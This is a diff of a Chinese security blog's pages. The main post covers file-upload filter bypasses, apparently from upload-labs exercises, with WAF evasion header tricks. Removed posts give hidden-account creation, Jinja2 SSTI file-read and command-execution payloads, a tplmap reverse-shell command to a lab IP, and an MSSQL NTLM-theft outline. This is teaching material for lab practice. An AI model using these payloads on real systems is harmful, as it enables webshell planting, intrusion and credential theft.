+$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);
+   $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);
+   $file_name = deldot($file_name);//删除文件名末尾的点
+   $file_ext = strrchr($file_name, &apos;.&apos;);
+   $file_ext = strtolower($file_ext); //转换为小写
+   $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA
+   $file_ext = trim($file_ext); //收尾去空
+   if(!in_array($file_ext, $deny_ext)) {
+       $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
+       $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;     
+黑名单过滤相对较全，但是没有将后缀进行大小写统一，可通过大小写绕过
+黑名单过滤不全面，由于这里不限制.htaccess，可通过上传一个.htaccess重写文件解析规则
+
+pass-5：       
+$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
+$file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);
+$file_name = deldot($file_name);//删除文件名末尾的点
+$file_ext = strrchr($file_name, &apos;.&apos;);
+$file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA
+$file_ext = trim($file_ext); //首尾去空
+if(!in_array($file_ext, $deny_ext)) {
+    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
+    $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;黑名单过滤较全，但是没有将后缀进行大小写统一，可通过大小写绕过
+pass-6：   
+if (file_exists(UPLOAD_PATH)) {
+    $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
+    $file_name = $_FILES[&apos;upload_file&apos;][&apos;name&apos;];
+    $file_name = deldot($file_name);//删除文件名末尾的点
+    $file_ext = strrchr($file_name, &apos;.&apos;);
+    $file_ext = strtolower($file_ext); //转换为小写
+    $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA
+    if(!in_array($file_ext, $deny_ext)) {
+        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
+        $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;同样还是黑名单，但是没有对后缀名去空出来，后缀名加空格绕过
+pass-7（系统特性绕过）       
+$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
+$file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);
+$file_ext = strrchr($file_name, &apos;.&apos;);
+$file_ext = strtolower($file_ext); //转换为小写
+$file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA
+$file_ext = trim($file_ext); //首尾去空
+if(!in_array($file_ext, $deny_ext)) {
+    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
+    $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;同样还是黑名单，但是没有对后缀名去 . 处理；由于在windows中会自动去掉后缀名中末尾的 .  , 即在后缀名末尾加 . 可绕过
+pass-8:（系统特性绕过）   
+if (file_exists(UPLOAD_PATH)) {
+ $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
+ $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);
+ $file_name = deldot($file_name);//删除文件名末尾的点
+ $file_ext = strrchr($file_name, &apos;.&apos;);
+ $file_ext = strtolower($file_ext); //转换为小写
+ $file_ext = trim($file_ext); //首尾去空
+ if(!in_array($file_ext, $deny_ext)) {
+     $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
+     $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;同样还是黑名单,但是没有对后缀名进行去”::$DATA”处理，利用windows特性，可在后缀名中加” ::$DATA”绕过
+pass-9:
+$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
+    $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);
+    $file_name = deldot($file_name);//删除文件名末尾的点
+    $file_ext = strrchr($file_name, &apos;.&apos;);
+    $file_ext = strtolower($file_ext); //转换为小写
+    $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA
+    $file_ext = trim($file_ext); //首尾去空
+
+    if (!in_array($file_ext, $deny_ext)) {
+        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
+        $img_path = UPLOAD_PATH.&apos;/&apos;.$file_name;黑名单过滤很全面，但是同样利用windows特性，构造paylaod， shell.php. .  
+pass-10:  
+if (file_exists(UPLOAD_PATH)) {
+    $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);
+    $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);
+    $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);
+    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
+    $img_path = UPLOAD_PATH.&apos;/&apos;.$file_name;  黑名单过滤，将黑名单后缀替换为空，可双写后缀名绕过
+4、白名单后缀名绕过pass-11：
+$ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;);
+$file_ext = substr($_FILES[&apos;upload_file&apos;][&apos;name&apos;],strrpos($_FILES[&apos;upload_file&apos;][&apos;name&apos;],&quot;.&quot;)+1);
+if(in_array($file_ext,$ext_arr)){
+    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
+    $img_path = $_GET[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;$img_path采用拼接方式，可通过路径名截断绕过，burpsuit抓包，上传shell.png,save_path改成../upload/11.php%00
+
+访问http://127.0.0.1/upload/shell.php
+%00截断利用条件：
+
+需满足 php 版本&lt;5.3.4
+php.ini中的magic_quotes_gpc是off状态的,受限于addslasheshes函数
+
+pass-12:    
+$ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;);
+$file_ext = substr($_FILES[&apos;upload_file&apos;][&apos;name&apos;],strrpos($_FILES[&apos;upload_file&apos;][&apos;name&apos;],&quot;.&quot;)+1);
+if(in_array($file_ext,$ext_arr)){
+    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
+    $img_path = $_POST[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;与pass-11不同的时这里使用POST形式传入save_path,由于POST不能对%00自动解码，需要使用0x00进行绕过
+上传shell.png,save_path改成../upload/11.php+  ; 使用 + 是为了方便定位，一直+ 对应的hex为2b，直接修改2b为00即可
+
+访问 http://127.0.0.1/upload/shell.php
+
+其实两个截断的原理都是0x00是字符串的结束标识符，且需要注意的是0x00截断的使用是在路径上！！！！！
+pass-19也同样使用路径拼接的方式，同理，在save_name使用0x00截断即可绕过白名单但是不采取路径拼接的情况下应该考虑,htaccess解析规则和解析漏洞
+5、文件头检查绕过pass-13：    
+$file = fopen($filename, &quot;rb&quot;);
+$bin = fread($file, 2); //只读2字节
+fclose($file);
+$strInfo = @unpack(&quot;C2chars&quot;, $bin);    
+$typeCode = intval($strInfo[&apos;chars1&apos;].$strInfo[&apos;chars2&apos;]);    
+$fileType = &apos;&apos;;    
+switch($typeCode){      
+    case 255216:            
+        $fileType = &apos;jpg&apos;;
+        break;
+    case 13780:            
+        $fileType = &apos;png&apos;;
+        break;        
+    case 7173:            
+        $fileType = &apos;gif&apos;;
+        break;
+    default:            
+        $fileType = &apos;unknown&apos;;
+    }    
+    return $fileType;检验文件头，手动添加 GIF89a即可绕过；pass-14 、pass-15同理
+6、条件竞争绕过pass-17:     
+   $ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;);
+$file_name = $_FILES[&apos;upload_file&apos;][&apos;name&apos;];
+$temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
+$file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);
+$upload_file = UPLOAD_PATH . &apos;/&apos; . $file_name;
+
+
+if(move_uploaded_file($temp_file, $upload_file)){
+    if(in_array($file_ext,$ext_arr)){
+         $img_path = UPLOAD_PATH . &apos;/&apos;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+         rename($upload_file, $img_path);
+         $is_upload = true;
+    }else{
+        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
+        unlink($upload_file);
+    }在if判断之前，已经move_uploaded_file将文件上传到目录中，如果后缀不在白名单内再删除，此时利用竞争条件争在保存文件后删除文件前来执行php文件在burpsuit不断发包，然后网页不断刷新访问
+
+
+既然能执行命令，那么可以通过执行命令写一个webshell,pass-18同样是条件竞争
+upload_labs:这里面比较通杀的方法是采用aaa.php:jpg 的方法生成一个aaa.php的空文件，然后使用aaa.&lt;&lt;&lt;再次写入文件内容。
+7、解析漏洞绕过Apache1.X 2.X解析漏洞：Apache在以上版本中，解析文件名的方式是从后向前识别扩展名，直到遇见Apache可识别的扩展名为止。shell.php.jpg  —&gt;被解析为php脚本执行
+IIS6.0中两个解析缺陷：（iis6.0 默认的可执行文件除了asp还包含这三种asa、cer、cdx） 
+目录名包含.asp、.asa、.cer的话，则该目录下的所有文件都将按照asp解析执行     
+xxx.jpg在xxx.asp目录下，xxx.jpg则按照asp解析执行文件名中如果包含.asp;、.asa;、.cer;则优先使用asp解析（这是因为在IIS6.0下，分号后面的不被解析）    xx.asp;.jpg被解析为asp脚本执行
+Nginx解析漏洞： 
+
+Nginx 0.5.* 
+Nginx 0.6.* 
+Nginx 0.7 &lt;= 0.7.65 
+Nginx 0.8 &lt;= 0.8.37
+
+以上Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell.jpg，然后以shell.jpg.php进行请求。
+IIS 7.0/Nginx0.8.41–1.5.6畸形解析漏洞
+上传一个在waf白名单之内扩展名的文件shell.jpg，然后以shell.jpg/.php进行请求。
+PHP CGI解析漏洞：
+IIS 7.0/7.5Nginx &lt; 0.8.3以上的容器版本中默认php配置文件cgi.fix_pathinfo=1时，上传一个存在于白名单的扩展名文件shell.jpg，在请求时以shell.jpg/shell.php请求，会将shell.jpg以php来解析
+多个Content-Disposition：
+在IIS的环境下，上传文件时如果存在多个Content-Disposition的话，IIS会取第一个Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话便会被绕过
+8、iconv函数限制上传在iconv转码的过程中,utf-&gt;gb2312(其他部分编码之间转换同样存在这个问题)会导致字符串被截断，如：
+$filename=”shell.php(hex).jpg”;(hex为0x80-0x99)，经过iconv转码后会变成$filename=”shell.php “;
+9、双文件上传：上传点支持多文件上传，但是却只对第一个文件做了过滤
+f12找到上传的post表单，action属性是指定上传检测页面，补全url: https://www.xxx.com/xxx.php(asp)，
+然后构造本地post提交表单第一个文件上传正常文件，第二个文件上传我们想要上传的webshell等
+10、waf缺陷绕过安全狗4.0：
+文件名回车绕过：（在文件名中插入特殊符号：分号、空格、单引号、换行符）
+filename=&quot;shell.php&quot;
+或者
+filename=&quot;shell.php&quot;==绕过：（===同样也可以过）
+filename==&quot;shell.php&quot;双写filename=;绕过
+filename=;filename=&quot;shell.php&quot;%00截断 在文件名后面加上%00然后CTRL+SHIFT+U转成字符，这里后面不用加.jpg也可以
+filename=&quot;shell.php .jpg&quot;上传文件的Content-Disposition扩展头字段在filename前插入任意字符长度?=508即可绕过安全狗上传任意后缀
+原因是文件Content-Disposition字段的长度验证不准确
+x*508;filename=&quot;shell.php&quot;垃圾字符填充：
+filename=&quot;%20*500+1.php&quot;修改头特征：
+去掉form-data
+原：
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;
+bypass：
+Content-Disposition: name=&quot;file&quot;; filename=&quot;shell.php&quot;(form-data;的意思是内容描述，form-data的意思是来自表单的数据，但是即使不写form-data，apache也接受。)或者更改form-data为一些不相关的值；
+还可以增加额外的头进行干扰
+Content-Type: image/gif
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;
+Content-Type: image/gif在http头增加额外字符：
+AAAAAAAA:filename=&quot;secquan.jpg&quot;;
+Content-Disposition: form-data; name=&quot;file&quot;;  filename=&quot;shell.php&quot;
+Content-Type: image/gifBaidu cloud ：
+filename=&quot;xss.jpg .Php&quot;阿里云：
+删掉Content-Type: image/jpeg即可绕过
+云锁：正则的核心在匹配filename后面的值，思路是让它找不到匹配点。
+原：
+Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;shell.php&quot;
+bypass：
+Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=shell.php；对于换行等字符的其他应用：
+对filename进行换行
+filen
+ame=&quot;shell.php&quot;对 = 换行
+filename=
+&quot;shell.php&quot;Tr3jer_CongRong大佬的总结：
+
+filename在content-type下面
+.asp{80-90}
+NTFS ADS
+.asp…
+boundary不一致（boundary后添加空格）
+iis6分号截断asp.asp;asp.jpg
+apache解析漏洞php.php.ddd
+boundary和content-disposition中间插入换行
+hello.php:a.jpg然后hello.&lt;&lt;&lt;
+filename=php.php
+filename=”a.txt”;filename=”a.php”
+name=\n”file”;filename=”a.php”
+content-disposition:\n
+.htaccess文件
+a.jpg.\nphp
+去掉content-disposition的form-data字段
+php&lt;5.3 单双引号截断特性
+删掉content-disposition: form-data;
+content-disposition\00:
+{char}+content-disposition
+head头的content-type: tab
+head头的content-type: multipart/form-DATA
+filename后缀改为大写
+head头的Content-Type: multipart/form-data;\n
+.asp空格
+.asp0x00.jpg截断
+双boundary
+file\nname=”php.php”
+head头content-type空格:
+form-data字段与name字段交换位置
+
+链接：https://www.cnblogs.com/-qing-/p/10832850.html
+https://xz.aliyun.com/t/2435
+https://paper.seebug.org/219/
+
+
+
+                            </div>
+                            <div class="post-tags">
+                                
+                            </div>
+                            <div class="other">
+                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
+                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
+                                <span><i class="iconfont icon-shijian"></i>May 24, 2020</span>
+                            </div>
+                        </div>
+                    </a>
                 
                     <a title="HSTS bypassing" alt="HSTS bypassing" href="/2020/05/21/HSTS-bypassing/"
                        class="post-item swiper-slide flex flex-v">
@@ -1807,203 +2808,6 @@ Content-Length: 52
 
 成功验证XXE
 
-
-
-
-                            </div>
-                            <div class="post-tags">
-                                
-                            </div>
-                            <div class="other">
-                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
-                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
-                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
-                            </div>
-                        </div>
-                    </a>
-                
-                    <a title="调用API绕过杀软添加用户" alt="调用API绕过杀软添加用户" href="/2020/04/26/%E8%B0%83%E7%94%A8API%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7/"
-                       class="post-item swiper-slide flex flex-v">
-                        <div class="image">
-                            
-                                <img title="调用API绕过杀软添加用户" alt="调用API绕过杀软添加用户"
-                                     src="/images/default.jpg"></img>
-                            
-                        </div>
-                        <div class="content-warp flex1 flex flex-v">
-                            <div class="title">&lt; 调用API绕过杀软添加用户 &gt;</div>
-                            <div class="content flex1">
-                                
-  创建隐藏账户：
-net user tw$ password /add  ###用户名为tw，密码为password的
-也可以通过修改注册表实现，需要system权限    如何发现隐藏账户：
-通过组查看：
-net localgroup administrators 
-net localgroup users直接查看注册表，有什么用户一目了然HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\
-一般情况下，添加用户的net会被拦截，下面介绍通过API调用的方式绕过
-实现：
-微软提供C++实现原型：
-#ifndef UNICODE
-#define UNICODE
-#endif
-#pragma comment(lib, &quot;netapi32.lib&quot;)
-
-#include &lt;stdio.h&gt;
-#include &lt;assert.h&gt;
-#include &lt;windows.h&gt; 
-#include &lt;lm.h&gt;
-
-int wmain(int argc, wchar_t *argv[])
-{
-   LPGROUP_USERS_INFO_0 pBuf = NULL;
-   DWORD dwLevel = 0;
-   DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
-   DWORD dwEntriesRead = 0;
-   DWORD dwTotalEntries = 0;
-   NET_API_STATUS nStatus;
-
-   if (argc != 3)
-   {
-  fwprintf(stderr, L&quot;Usage: %s \\\\ServerName UserName\n&quot;, argv[0]);
-  exit(1);
-   }
-
-   nStatus = NetUserGetGroups(argv[1],
-  argv[2],
-  dwLevel,
-  (LPBYTE*)&amp;pBuf,
-  dwPrefMaxLen,
-  &amp;dwEntriesRead,
-  &amp;dwTotalEntries);
-
-   if (nStatus == NERR_Success)
-   {
-  LPGROUP_USERS_INFO_0 pTmpBuf;
-  DWORD i;
-  DWORD dwTotalCount = 0;
-
-  if ((pTmpBuf = pBuf) != NULL)
-  {
- fprintf(stderr, &quot;\nGlobal group(s):\n&quot;);
-
- for (i = 0; i &lt; dwEntriesRead; i++)
- {
-assert(pTmpBuf != NULL);
-
-if (pTmpBuf == NULL)
-{
-   fprintf(stderr, &quot;An access violation has occurred\n&quot;);
-   break;
-}
-
-wprintf(L&quot;\t-- %s\n&quot;, pTmpBuf-&gt;grui0_name);
-
-pTmpBuf++;
-dwTotalCount++;
- }
-  }
-
-  if (dwEntriesRead &lt; dwTotalEntries)
- fprintf(stderr, &quot;\nTotal entries: %d&quot;, dwTotalEntries);
-
-  printf(&quot;\nEntries enumerated: %d\n&quot;, dwTotalCount);
-   }
-   else
-  fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus);
-
-   if (pBuf != NULL)
-  NetApiBufferFree(pBuf);
-
-   return 0;
-}NetUserAdd添加普通用户，然后NetLocalGroupAddMembers添加到管理组
-我用C实现效果如下：
-
-
-
-                            </div>
-                            <div class="post-tags">
-                                
-                            </div>
-                            <div class="other">
-                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
-                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
-                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
-                            </div>
-                        </div>
-                    </a>
-                
-                    <a title="SSTI[服务器模板注入]" alt="SSTI[服务器模板注入]" href="/2020/04/26/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"
-                       class="post-item swiper-slide flex flex-v">
-                        <div class="image">
-                            
-                                <img title="SSTI[服务器模板注入]" alt="SSTI[服务器模板注入]"
-                                     src="/images/default.jpg"></img>
-                            
-                        </div>
-                        <div class="content-warp flex1 flex flex-v">
-                            <div class="title">&lt; SSTI[服务器模板注入] &gt;</div>
-                            <div class="content flex1">
-                                
-  漏洞成因：
-用户输入未经过滤就交给引擎处理
-将python语句编译成一句话： 
-不同类型SSTI paylaod: 
-SSTI模板注入常见引擎：
-
-判断是哪种类型SSTI
-
-一个实例：
-nikto结果：+ Server: Werkzeug/0.14.1 Python/2.7.14 —&gt;有可能存在SSTI返回输入内容，已知
-
-检测SSTI
-
-name=49&amp;desc=yyyy   —&gt; Name: 7777777 desc: yyyy   —&gt; Jinja2（Twig将返回49）
-确定是jinja之后，尝试文件读取和命令执行
-读取文件
-{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
-命令执行：
-{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
-{{ config.from_pyfile('/tmp/evilconfig.cfg') }}
-{{ config['RUNCMD']('ping -c 10.10.14.14 9999',shell=True) }}SSTI注入工具tplmap： 
-python tplmap.py -u&apos;http://10.10.10.96:8080&apos; -X POST -d&apos;name=*desc=anything&apos; -c &apos;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI6MTU4NzczMTk1OX0.TTsnsWxpzkS32o7uluDl7n5Et4oTDcGiYAcfYPq2KjI&apos; --reverse-shell 10.10.14.14 9999
-
-
-                            </div>
-                            <div class="post-tags">
-                                
-                            </div>
-                            <div class="other">
-                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
-                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
-                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
-                            </div>
-                        </div>
-                    </a>
-                
-                    <a title="MSSQL NTLM stealer" alt="MSSQL NTLM stealer" href="/2020/04/26/MSSQL-NTLM-stealer/"
-                       class="post-item swiper-slide flex flex-v">
-                        <div class="image">
-                            
-                                <img title="MSSQL NTLM stealer" alt="MSSQL NTLM stealer"
-                                     src="/images/default.jpg"></img>
-                            
-                        </div>
-                        <div class="content-warp flex1 flex flex-v">
-                            <div class="title">&lt; MSSQL NTLM stealer &gt;</div>
-                            <div class="content flex1">
-                                
-  可窃取NTLM的漏洞及利用方式
-利用原理MSSQL数据库通常也用来存储客户端的个人身份信息（PII），并且对更高级别的员工或执行人员产生最大的影响。利用低权限用户帐户，然后针对MSSQL的集成域身份验证重新使用该信息。
-如果数据库接受域身份验证，则通过插入目标UNC路径来滥用本机db过程’xp_dirtree’访问该路径随后在responder侦听的445端口上回调给攻击者。如果成功，MSSQL服务帐户将进行身份验证并提供NetNTLM哈希
-环境说明：https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1存在MSSQL SQLi，发现高权限账户但无法读取密码
-漏洞利用
-默认情况ASP/MSSQL支持堆叠注入：
